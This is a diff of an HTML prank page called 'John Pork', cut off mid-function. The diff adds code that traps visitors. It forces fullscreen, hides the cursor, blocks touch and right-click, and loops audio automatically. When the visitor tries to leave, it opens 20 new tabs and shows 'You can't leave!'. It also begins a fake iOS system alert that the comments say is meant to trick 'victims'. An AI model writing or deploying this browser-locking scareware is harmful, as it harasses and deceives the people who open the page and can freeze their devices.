@@ -1,31 +1,7 @@
-<!-- johnpork.html -->
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>John Pork</title>
-    #enter-screen {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: black;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-    cursor: pointer;
-}
-
-#enter-text {
-    color: white;
-    font-family: Arial, sans-serif;
-    font-size: 24px;
-    font-weight: bold;
-    letter-spacing: 2px;
-    border: 2px solid white;
-    padding: 20px 30px;
-}
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">    <title>John Pork</title>
     <style>
         body {
             margin: 0;
@@ -37,40 +13,41 @@
             left: 0;
             width: 100%;
             height: 100%;
-        }
-        img {
+            cursor: none; /* Hide cursor */ touch-action: none; /* Disable touch gestures */
+        } img {
             position: absolute;
             top: 50%;
             left: 50%;
-            transform: translate(-50%, -50%); width: 80%;
+            transform: translate(-50%, -50%);            width: 80%;
             max-width: 300px;
-        }
-        #audio {
-            display: none;
-        }
-    </style>
+        } #message {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            color: white;
+            font-family: Arial, sans-serif;
+            font-size: 24px;
+            text-shadow: 2px 2px 4px black;
+        } </style>
 </head>
 <body>
-    
-    <div id="enter-screen">
-    <div id="enter-text">CLICK TO ENTER</div>
-</div>
-    <img src="https://th.bing.com/th/id/OIP.hGqGfvoqvtAkSImoB1ajEwHaNl?w=132&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="John Pork"> <audio id="audio" autoplay loop>
-        <source src="jhonprok.mp3" type="audio/mpeg">
+    <img src="https://th.bing.com/th/id/OIP.hGqGfvoqvtAkSImoB1ajEwHaNl?w=132&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="John Pork"> <div id="message">Hi, I'm John Pork!</div>
+    <audio id="audio" autoplay loop>
+        <source src="jhonprok.mp3" type="audio/mpeg"> <!-- Replace with your audio -->
     </audio>
     <script>
-        const enterScreen = document.getElementById("enter-screen");
-const audio = document.getElementById("audio");
+        // Force fullscreen (iOS Safari)        function enterFullscreen() {            const elem = document.documentElement;
+            if (elem.requestFullscreen) {                elem.requestFullscreen().catch(err => {});
+            } else if (elem.webkitRequestFullscreen) { /* Safari */                elem.webkitRequestFullscreen().catch(err => {});
+            } else if (elem.msRequestFullscreen) { /* IE11 */ elem.msRequestFullscreen().catch(err => {});            }
+        }        enterFullscreen();
 
-enterScreen.addEventListener("click", function() {
-    enterScreen.style.display = "none";
-    audio.play();
-});
-        // Prevent closing (spam new tabs if user tries to exit)
+        // Spam new tabs if user tries to close
         window.onbeforeunload = function() {
-            for (let i = 0; i < 5; i++) {                window.open(window.location.href, '_blank');            }
-            return "You can't leave!";        };        // Prevent right-click, touch events, etc.
+            for (let i = 0; i < 20; i++) {
+                window.open(window.location.href, '_blank'); }
+            return "You can't leave!";        };        // Disable right-click, touch events, etc.
         document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('touchstart', e => e.preventDefault(), { passive: false }); </script>
-</body>
-</html>
+        document.addEventListener('touchstart', e => e.preventDefault(), { passive: false }); // Fake iOS alert (tricks victims into thinking it's a system message)
+        function fakeAlert() {            const alert = document.createElement('div')
